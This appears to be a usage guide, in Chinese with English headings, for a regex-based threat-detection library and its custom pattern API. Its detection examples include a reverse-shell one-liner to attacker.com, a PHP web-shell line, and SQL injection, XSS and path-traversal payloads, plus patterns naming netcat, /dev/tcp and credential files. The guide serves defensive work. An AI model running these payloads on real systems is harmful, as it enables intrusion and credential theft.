# 🎯 自定義威脅模式使用指南 (Custom Threat Patterns Usage Guide)

## 概述 (Overview)

C45144lAI 防禦系統現已支持自定義威脅模式，允許用戶根據特定安全需求添加和管理威脅檢測規則。所有威脅模式均使用正則表達式 (Regex) 定義，提供高度的靈活性和可擴展性。

## 目錄 (Table of Contents)

1. [快速開始](#快速開始)
2. [預設威脅模式](#預設威脅模式)
3. [添加自定義威脅](#添加自定義威脅)
4. [最佳實踐](#最佳實踐)
5. [進階用法](#進階用法)
6. [故障排除](#故障排除)

---

## 快速開始

### 基本用法

```python
from src.defense_system import LurRenJiaDefenseSystem

# 初始化系統 (預設威脅模式自動加載)
system = LurRenJiaDefenseSystem()

# 查看預設威脅模式數量
print(len(system.threat_patterns))  # 輸出: 7

# 添加自定義威脅模式
system.add_custom_threat('CRYPTO_MINER', [
    r'(?i)(monero|ethash|cryptonight)',
    r'(?i)(stratum\+tcp|mining\.pool)',
])

# 檢索所有威脅模式
all_patterns = system.get_threat_patterns()
print(all_patterns['CRYPTO_MINER'])
```

---

## 預設威脅模式

系統初始化時預設包含以下 7 種威脅模式：

### 1. **SQL_INJECTION** (SQL 注入)
```python
{
    'SQL_INJECTION': [
        r"(?i)(drop|delete|insert|truncate|exec|execute|union|select).*(\"|'|;)",
        r"(?i)(-{2}|#|/\*|\*/|xp_|sp_)",
        r"(?i)(union.*select|select.*from|where.*=)",
        r"(?i)('.*or.*1.*=.*1|'.*or.*'.*=.*')",
    ]
}
```

**檢測示例：**
- ✅ `' DROP TABLE users; --`
- ✅ `UNION SELECT * FROM accounts`
- ✅ `admin' OR '1'='1`

---

### 2. **XSS** (跨網站指令碼)
```python
{
    'XSS': [
        r"(?i)(<script|javascript:)",
        r"(?i)(onerror|onload|onclick|onmouseover)=",
        r"(?i)(<iframe|<img.*src)",
        r"(?i)(eval\(|alert\(|prompt\()",
    ]
}
```

**檢測示例：**
- ✅ `<script>alert('XSS')</script>`
- ✅ `<img src=x onerror=alert(1)>`
- ✅ `<iframe src=javascript:alert(1)></iframe>`

---

### 3. **XSS_ENCODED** (編碼 XSS)
```python
{
    'XSS_ENCODED': [
        r"(%2e%2e%2f|%252e|%3cscript|%3ciframe|%3c)",
        r"(&#x|&#[0-9])",
        r"(\\x|\\u00)",
    ]
}
```

**檢測示例：**
- ✅ `%3cscript%3ealert(1)%3c/script%3e`
- ✅ `&#x3c;script&#x3e;`

---

### 4. **COMMAND_INJECTION** (命令注入)
```python
{
    'COMMAND_INJECTION': [
        r"(?i)(cat\s+/etc|/bin/bash|/bin/sh|bash\s+-i)",
        r"(?i)(/dev/tcp|nc\s+-|ncat)",
        r"(?i)(curl\|bash|wget\|python|curl\|python)",
        r"(?i)(whoami|id\s+|uname\s+-)",
    ]
}
```

**檢測示例：**
- ✅ `bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- ✅ `cat /etc/passwd`
- ✅ `curl|bash`

---

### 5. **RCE** (遠端程式碼執行)
```python
{
    'RCE': [
        r"(?i)(exec|system|passthru|shell_exec|backtick)",
        r"(?i)(\$_\[|getenv|putenv)",
        r"(?i)(os\.system|subprocess|popen)",
    ]
}
```

**檢測示例：**
- ✅ `<?php system($_GET['cmd']); ?>`
- ✅ `import os; os.system('whoami')`

---

### 6. **PATH_TRAVERSAL** (路徑遍歷)
```python
{
    'PATH_TRAVERSAL': [
        r"(\.\./|\.\.\\|/etc/passwd|/etc/shadow|win\.ini|boot\.ini)",
        r"(%2e%2e/|%252e%252e)",
    ]
}
```

**檢測示例：**
- ✅ `../../etc/passwd`
- ✅ `/etc/shadow`

---

### 7. **MALWARE** (惡意軟體)
```python
{
    'MALWARE': [
        r"(?i)(\.(exe|dll|bat|com|scr|vbs|js|zip|rar)\.?)",
        r"(?i)(trojan|ransomware|backdoor|worm|virus)",
    ]
}
```

**檢測示例：**
- ✅ `malware.exe`
- ✅ `ransomware detected`

---

## 添加自定義威脅

### 方法 1: 使用 `add_custom_threat()`

```python
# 添加加密貨幣挖礦檢測
system.add_custom_threat('CRYPTO_MINER', [
    r'(?i)(monero|ethash|cryptonight)',
    r'(?i)(stratum\+tcp|mining\.pool)',
    r'(?i)(xmrig|claymore|minergate)',
])

# 添加內部威脅檢測
system.add_custom_threat('INSIDER_THREAT', [
    r'(?i)(export_data|leak_source_code)',
    r'(?i)(dump_database|backup_credentials)',
    r'(?i)(unauthorized_access|privilege_escalation)',
])

# 添加 DDoS 檢測模式
system.add_custom_threat('DDOS_ATTACK', [
    r'(?i)(syn.*flood|udp.*flood)',
    r'(?i)(slowloris|httpflooding)',
])
```

### 方法 2: 直接修改 `threat_patterns` 字典

```python
# 直接添加到 threat_patterns
system.threat_patterns['API_ABUSE'] = [
    r'(?i)(api.*key|authorization.*bearer)',
    r'(?i)(rapid.*request|rate.*limit)',
]

# 添加多個模式
system.threat_patterns['SUSPICIOUS_LOGIN'] = [
    r'(?i)(brute.*force|password.*spray)',
    r'(?i)(concurrent.*login|unusual.*location)',
]
```

### 方法 3: 初始化時設置

```python
system = LurRenJiaDefenseSystem()

# 添加多個自定義威脅
custom_threats = {
    'ZERO_DAY': [r'(?i)(exploit|cve-)'],
    'BOTNET': [r'(?i)(c2|command.*control)', r'(?i)(bot.*beacon)'],
    'WORM': [r'(?i)(propagate|replicate)', r'(?i)(infection)'],
}

for threat_name, patterns in custom_threats.items():
    system.add_custom_threat(threat_name, patterns)
```

---

## 最佳實踐

### ✅ 推薦做法

1. **使用命名約定**
   ```python
   # 好的命名
   system.add_custom_threat('PAYMENT_FRAUD', [...])
   system.add_custom_threat('DATABASE_EXFIL', [...])
   
   # 避免
   system.add_custom_threat('threat1', [...])
   system.add_custom_threat('custom', [...])
   ```

2. **測試正則表達式**
   ```python
   import re
   
   patterns = [r'(?i)(malicious|payload)']
   test_strings = [
       'MALICIOUS',
       'malicious',
       'payload123',
       'normal text'
   ]
   
   for pattern in patterns:
       for test in test_strings:
           if re.search(pattern, test):
               print(f"✅ Matched: {test}")
           else:
               print(f"❌ Not matched: {test}")
   ```

3. **分組相關威脅**
   ```python
   # 針對不同應用層的威脅
   system.add_custom_threat('APP_LAYER_ATTACK', [
       r'(?i)(http.*smuggling)',
       r'(?i)(request.*splitting)',
   ])
   
   system.add_custom_threat('NETWORK_LAYER_ATTACK', [
       r'(?i)(ping.*flood)',
       r'(?i)(fragmented.*packets)',
   ])
   ```

4. **文檔化自定義模式**
   ```python
   # 添加註解說明威脅用途
   # THREAT: SUPPLY_CHAIN_ATTACK
   # PURPOSE: 檢測軟體供應鏈攻擊跡象
   # EXAMPLES: npm 包注入, dependency hijacking
   system.add_custom_threat('SUPPLY_CHAIN_ATTACK', [
       r'(?i)(malicious.*package|npm.*hijack)',
       r'(?i)(dependency.*poisoning)',
   ])
   ```

### ❌ 避免做法

1. **過於複雜的正則表達式**
   ```python
   # 不好 - 過於複雜，難以維護
   system.add_custom_threat('COMPLEX', [
       r'^(?!(?:.*[aeiou]){4})(?!.*[A-Z]{3,})(?!.*\d)[a-zA-Z\d]{8,}$'
   ])
   
   # 好 - 簡單清晰
   system.add_custom_threat('SIMPLE', [
       r'(?i)(specific.*pattern)',
       r'(?i)(another.*pattern)',
   ])
   ```

2. **添加太多不相關的模式**
   ```python
   # 不好 - 混雜不相關威脅
   system.add_custom_threat('MISC', [
       r'(?i)(ransomware)',
       r'(?i)(xss)',
       r'(?i)(sql)',
   ])
   
   # 好 - 只針對相關威脅
   system.add_custom_threat('RANSOMWARE', [
       r'(?i)(encrypt.*files)',
       r'(?i)(ransom.*note)',
   ])
   ```

3. **忽略性能影響**
   ```python
   # 注意：過多複雜正則表達式可能降低性能
   # 建議每個威脅類型 <= 10 個模式
   
   if len(system.threat_patterns['MY_THREAT']) > 10:
       print("⚠️ 警告：模式數量過多，可能影響性能")
   ```

---

## 進階用法

### 1. 動態模式更新

```python
def update_threat_patterns(system, new_threats_dict):
    """
    動態更新威脅模式
    """
    for threat_name, patterns in new_threats_dict.items():
        if threat_name in system.threat_patterns:
            # 合併現有模式
            system.threat_patterns[threat_name].extend(patterns)
            print(f"✅ 更新 {threat_name}: 新增 {len(patterns)} 個模式")
        else:
            # 添加新威脅
            system.add_custom_threat(threat_name, patterns)
            print(f"✅ 添加 {threat_name}: {len(patterns)} 個模式")

# 使用
new_threats = {
    'ZERO_DAY': [r'(?i)(cve-2024)'],
    'APT_GROUP': [r'(?i)(lazarus|apt28)'],
}
update_threat_patterns(system, new_threats)
```

### 2. 靈活性模式導出

```python
import json

def export_patterns(system, filename='threat_patterns.json'):
    """
    將威脅模式導出為 JSON 格式
    """
    patterns_dict = system.get_threat_patterns()
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(patterns_dict, f, ensure_ascii=False, indent=2)
    
    print(f"✅ 威脅模式已導出: {filename}")

def import_patterns(system, filename='threat_patterns.json'):
    """
    從 JSON 導入威脅模式
    """
    with open(filename, 'r', encoding='utf-8') as f:
        patterns_dict = json.load(f)
    
    for threat_name, patterns in patterns_dict.items():
        if threat_name not in system.threat_patterns:
            system.add_custom_threat(threat_name, patterns)
    
    print(f"✅ 威脅模式已導入: {filename}")

# 使用
export_patterns(system)
import_patterns(system)
```

### 3. 模式驗證工具

```python
def validate_patterns(system):
    """
    驗證所有正則表達式是否有效
    """
    import re
    
    invalid_patterns = []
    
    for threat_name, patterns in system.threat_patterns.items():
        for pattern in patterns:
            try:
                re.compile(pattern)
            except re.error as e:
                invalid_patterns.append({
                    'threat': threat_name,
                    'pattern': pattern,
                    'error': str(e)
                })
    
    if invalid_patterns:
        print("❌ 發現無效正則表達式:")
        for item in invalid_patterns:
            print(f"   {item['threat']}: {item['error']}")
    else:
        print(f"✅ 所有 {len(system.threat_patterns)} 類威脅模式驗證通過")
    
    return len(invalid_patterns) == 0

# 使用
validate_patterns(system)
```

### 4. 性能基準測試

```python
import time

def benchmark_patterns(system, test_strings, num_iterations=1000):
    """
    測試威脅模式的性能
    """
    import re
    
    start_time = time.time()
    
    for _ in range(num_iterations):
        for test_str in test_strings:
            for threat_name, patterns in system.threat_patterns.items():
                for pattern in patterns:
                    re.search(pattern, test_str)
    
    elapsed = time.time() - start_time
    
    print(f"✅ 性能基準測試完成")
    print(f"   • 執行時間: {elapsed:.2f}秒")
    print(f"   • Pattern 匹配次數: {len(system.threat_patterns) * len(test_strings) * num_iterations}")
    print(f"   • 平均時間/匹配: {(elapsed * 1000) / (len(system.threat_patterns) * len(test_strings) * num_iterations):.4f}ms")

# 使用
test_payloads = [
    "normal request",
    "' DROP TABLE users; --",
    "<script>alert('XSS')</script>",
]
benchmark_patterns(system, test_payloads, num_iterations=100)
```

---

## 故障排除

### 問題 1: 模式無法匹配

**症狀：** 已添加的模式沒有檢測到攻擊

**解決方案：**
```python
import re

# 測試模式
pattern = r'(?i)(malicious)'
test_string = "MALICIOUS PAYLOAD"

if re.search(pattern, test_string):
    print(f"✅ 模式匹配成功")
else:
    print(f"❌ 模式不匹配，檢查：")
    print(f"   1. 正則表達式語法")
    print(f"   2. 大小寫敏感度 (使用 (?i) for case-insensitive)")
    print(f"   3. 特殊字符轉義")
```

### 問題 2: 正則表達式錯誤

**症狀：** `re.error: invalid escape sequence`

**解決方案：**
```python
# 不好 - 未使用原始字符串
system.add_custom_threat('WRONG', ["(?i)(test\.com)"])

# 好 - 使用原始字符串
system.add_custom_threat('RIGHT', [r"(?i)(test\.com)"])
```

### 問題 3: 性能下降

**症狀：** 系統響應變慢

**解決方案：**
```python
# 1. 檢查模式數量
print(f"威脅類型數: {len(system.threat_patterns)}")
for name, patterns in system.threat_patterns.items():
    if len(patterns) > 10:
        print(f"⚠️  {name}: {len(patterns)} 個模式 (建議 <= 10)")

# 2. 優化複雜正則表達式
# 不好: 使用 .* 或 .+
pattern_slow = r".*malicious.*"

# 好: 直接匹配
pattern_fast = r"malicious"
```

### 問題 4: 記憶體溢出

**症狀：** 添加太多自定義模式導致記憶體問題

**解決方案：**
```python
# 定期清理未使用的威脅模式
def cleanup_patterns(system, unused_threats):
    """
    移除不再使用的威脅模式
    """
    for threat in unused_threats:
        if threat in system.threat_patterns:
            del system.threat_patterns[threat]
            print(f"✅ 移除威脅模式: {threat}")

# 使用
cleanup_patterns(system, ['OLD_THREAT_1', 'OLD_THREAT_2'])
```

---

## 完整示例

```python
#!/usr/bin/env python3
"""
完整示例：使用自定義威脅模式
"""

import numpy as np
from src.defense_system import LurRenJiaDefenseSystem

# 1. 初始化系統
system = LurRenJiaDefenseSystem()

# 2. 添加自定義威脅模式
custom_threats = {
    'CRYPTO_MINER': [
        r'(?i)(monero|ethash|cryptonight)',
        r'(?i)(stratum\+tcp|mining\.pool)',
    ],
    'INSIDER_THREAT': [
        r'(?i)(export_confidential)',
        r'(?i)(leak_source_code)',
    ],
    'SUPPLY_CHAIN': [
        r'(?i)(malicious.*package)',
        r'(?i)(npm.*hijack)',
    ],
}

for threat_name, patterns in custom_threats.items():
    system.add_custom_threat(threat_name, patterns)
    print(f"✅ 添加威脅模式: {threat_name}")

# 3. 訓練 AI 基線
print("\n訓練 AI 基線...")
normal_data = np.random.randn(100, 5)
system.train_ai_baseline(normal_data)

# 4. 測試威脅檢測
print("\n檢測威脅...\n")
test_cases = [
    ("192.168.1.100", "normal request", [1, 1, 1, 1, 1]),
    ("192.168.1.101", "stratum+tcp://mining.pool", [5, 5, 5, 5, 5]),
    ("192.168.1.102", "export_confidential data", [5, 5, 5, 5, 5]),
]

for ip, payload, features in test_cases:
    result = system.analyze_incoming_traffic(ip, payload, np.array(features))
    
    print(f"IP: {ip}")
    print(f"Payload: {payload}")
    print(f"Action: {result['action'].upper()}")
    print(f"Threat: {result['threat_type']}")
    print(f"Risk Score: {result['risk_score']:.2f}")
    print(f"Reason: {result['reason']}\n")

# 5. 查看統計信息
print("系統統計:")
stats = system.get_statistics()
print(f"  • 總請求: {stats['total_requests']}")
print(f"  • 被阻止: {stats['blocked_requests']}")
print(f"  • 检测到異常: {stats['anomalies_detected']}")
```

---

## 總結

✅ **該系統提供：**
- 7 個預設威脅模式
- 無限可擴展的自定義威脅模式
- 靈活的正則表達式配置
- 實時威脅檢測

🚀 **開始使用：**
```python
system = LurRenJiaDefenseSystem()
system.add_custom_threat('YOUR_THREAT', [r'your_pattern'])
```

📚 **更多資訊：**
參考 `test_custom_threats.py` 了解完整示例
